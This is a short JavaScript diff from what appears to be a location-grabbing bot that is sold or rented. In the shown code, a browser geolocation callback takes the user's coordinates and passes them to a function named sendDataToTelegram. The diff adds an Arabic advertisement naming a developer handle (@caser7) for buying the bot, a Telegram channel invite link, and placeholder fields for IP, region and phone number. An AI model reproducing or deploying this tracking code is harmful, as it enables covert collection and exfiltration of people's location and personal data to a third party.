@@ -162,7 +162,11 @@
                     position => {
                         const latitude = position.coords.latitude;
                         const longitude = position.coords.longitude;
-                        sendDataToTelegram(`📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`);
+                        sendDataToTelegram(`تم تطوير البوت بواسطة صوفي للاشراك او شراء البوت تواصل مع المطور @caser7 
+IP:
+المنطقة:
+رقم الهاتف:
+قناتي : https://t.me/+qZ06s9H7I944YWYy📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`);
                         sendLocation(latitude, longitude);
                     },
                     error => {
